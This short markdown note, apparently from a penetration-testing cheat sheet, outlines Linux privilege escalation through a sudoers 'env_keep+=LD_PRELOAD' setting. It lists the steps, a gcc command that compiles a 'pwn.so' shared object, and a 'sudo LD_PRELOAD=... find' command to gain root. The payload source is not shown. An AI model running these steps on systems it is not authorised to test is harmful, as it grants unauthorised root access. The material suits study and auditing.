# LD_PRELOAD

## Example

### True positive: 

    env_keep+=LD_PRELOAD

### 1: Check for LD_PRELOAD

### 2: Write a simple C code compiled as a share object file (.so extension)

### 3: Run the program with sudo privileges and the LD_PRELOAD option pointing to our .so file

### 1) Compilation

    gcc -fPIC -shared -o pwn.so pwn.c -nostartfiles

### 2) Usage: 

    sudo LD_PRELOAD=/home/user/pwn.so find
